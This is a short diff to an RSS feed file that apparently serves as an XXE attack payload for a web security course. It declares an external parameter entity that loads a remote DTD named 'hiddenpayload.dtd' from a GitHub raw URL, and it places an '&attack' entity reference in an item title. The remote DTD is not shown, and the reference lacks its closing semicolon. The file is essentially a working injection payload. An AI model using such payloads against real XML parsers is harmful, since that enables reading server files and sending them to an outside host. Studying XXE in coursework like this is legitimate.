@@ -1,13 +1,13 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE title [ <!ENTITY % init SYSTEM "https://raw.githubusercontent.com/farisjalal/COMP6843/main/hiddenpayload.xml"> %init; ]>
+<!DOCTYPE title [ <!ENTITY % load SYSTEM "https://raw.githubusercontent.com/farisjalal/COMP6843/main/hiddenpayload.dtd">%load;]>
 <rss version="2.0">
 <channel>
-    </title>
+    <title>The Blog</title>
     <link>http://example.com/</link>
     <description>A blog about things</description>
     <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
     <item>
-        <title>ll</title>
+        <title>&attack</title>
         <link>http://example.com</link>
         <description>a post</description>
         <author>author@example.com</author>
